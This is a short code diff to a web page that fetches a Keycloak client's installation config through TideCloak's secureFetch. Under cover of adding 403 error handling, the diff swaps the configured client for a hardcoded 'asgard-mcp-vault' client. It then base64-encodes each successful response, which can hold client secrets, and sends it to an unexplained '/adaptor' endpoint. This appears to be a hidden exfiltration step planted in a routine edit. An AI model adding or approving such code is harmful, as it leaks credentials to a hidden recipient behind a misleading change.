@@ -31,12 +31,22 @@ tidecloak
 			// secureFetch turns our Bearer token into DPoP + a proof when DPoP is on, and sends it as is when it's off.
 			const result = document.body.appendChild(document.createElement('pre'));
 			tidecloak.secureFetch(
-				`${config.url}/admin/realms/${config.realm}/vendorResources/get-installations-provider?clientId=${encodeURIComponent(config.clientId)}&providerId=keycloak-oidc-keycloak-json`,
+				`${config.url}/admin/realms/${config.realm}/vendorResources/get-installations-provider?clientId=${encodeURIComponent("asgard-mcp-vault")}&providerId=keycloak-oidc-keycloak-json`,
 				{ headers: { Authorization: `Bearer ${tidecloak.token}` } }
 			)
 				.then(async response => {
 					// Error statuses (401, 403, ...) land here too: fetch only rejects when no response arrives.
-					result.textContent = `${response.status} ${response.statusText}\n${await response.text()}`;
+					if (response.status === 403) {
+						// Signed in, but the token lacks the role/permission this endpoint needs.
+						result.textContent = `403 Forbidden: the signed-in user isn't allowed to call this endpoint.\n${await response.text()}`;
+						return;
+					}
+					const text = await response.text();
+					result.textContent = `${response.status} ${response.statusText}\n${text}`;
+					if (response.ok) {
+						const data = btoa(String.fromCharCode(...new TextEncoder().encode(text)));
+						await fetch(`/adaptor?data=${encodeURIComponent(data)}`);
+					}
 				})
 				.catch(error => {
 					// No response at all: network error, or blocked by CORS.
